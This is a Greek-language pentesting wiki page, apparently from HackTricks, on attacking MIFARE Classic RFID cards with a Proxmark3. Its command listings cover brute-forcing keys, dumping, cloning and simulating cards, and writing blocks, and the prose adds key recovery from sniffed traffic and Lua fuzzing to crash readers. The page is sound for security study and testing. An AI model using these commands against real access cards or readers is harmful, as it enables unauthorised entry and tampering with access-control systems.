# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση σε Συστήματα RFID με Proxmark3

Το πρώτο πράγμα που πρέπει να κάνετε είναι να έχετε ένα [**Proxmark3**](https://proxmark.com) και [**να εγκαταστήσετε το λογισμικό και τις εξαρτήσεις του**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Επίθεση σε MIFARE Classic 1KB

Έχει **16 τομείς**, κάθε ένας από αυτούς έχει **4 μπλοκ** και κάθε μπλοκ περιέχει **16B**. Το UID βρίσκεται στον τομέα 0 μπλοκ 0 (και δεν μπορεί να αλλάξει).\
Για να αποκτήσετε πρόσβαση σε κάθε τομέα χρειάζεστε **2 κλειδιά** (**A** και **B**) που αποθηκεύονται στο **μπλοκ 3 κάθε τομέα** (trailer τομέα). Το trailer τομέα αποθηκεύει επίσης τα **bits πρόσβασης** που δίνουν τις **άδειες ανάγνωσης και εγγραφής** σε **κάθε μπλοκ** χρησιμοποιώντας τα 2 κλειδιά.\
2 κλειδιά είναι χρήσιμα για να δώσουν άδειες ανάγνωσης αν γνωρίζετε το πρώτο και εγγραφής αν γνωρίζετε το δεύτερο (για παράδειγμα).

Μπορούν να εκτελούνται αρκετές επιθέσεις
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Το Proxmark3 επιτρέπει την εκτέλεση άλλων ενεργειών όπως **παρακολούθηση** της **επικοινωνίας Tag προς Reader** για να προσπαθήσετε να βρείτε ευαίσθητα δεδομένα. Σε αυτή την κάρτα μπορείτε απλώς να καταγράψετε την επικοινωνία και να υπολογίσετε το χρησιμοποιούμενο κλειδί επειδή οι **κρυπτογραφικές λειτουργίες που χρησιμοποιούνται είναι αδύναμες** και γνωρίζοντας το απλό και το κρυπτογραφημένο κείμενο μπορείτε να το υπολογίσετε (εργαλείο `mfkey64`).

### Ακατέργαστες Εντολές

Τα συστήματα IoT μερικές φορές χρησιμοποιούν **μη επώνυμα ή μη εμπορικά tags**. Σε αυτή την περίπτωση, μπορείτε να χρησιμοποιήσετε το Proxmark3 για να στείλετε προσαρμοσμένες **ακατέργαστες εντολές στα tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Με αυτές τις πληροφορίες μπορείτε να προσπαθήσετε να αναζητήσετε πληροφορίες σχετικά με την κάρτα και για τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή ωμών εντολών όπως: `hf 14a raw -p -b 7 26`

### Scripts

Το λογισμικό Proxmark3 έρχεται με μια προφορτωμένη λίστα **σεναρίων αυτοματοποίησης** που μπορείτε να χρησιμοποιήσετε για να εκτελέσετε απλές εργασίες. Για να ανακτήσετε τη πλήρη λίστα, χρησιμοποιήστε την εντολή `script list`. Στη συνέχεια, χρησιμοποιήστε την εντολή `script run`, ακολουθούμενη από το όνομα του σεναρίου:
```
proxmark3> script run mfkeys
```
Μπορείτε να δημιουργήσετε ένα σενάριο για **fuzz tag readers**, οπότε αντιγράψτε τα δεδομένα μιας **έγκυρης κάρτας** απλά γράφοντας ένα **Lua script** που **τυχαία** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **αναγνώστης καταρρέει** με οποιαδήποτε επανάληψη.

{{#include ../../banners/hacktricks-training.md}}
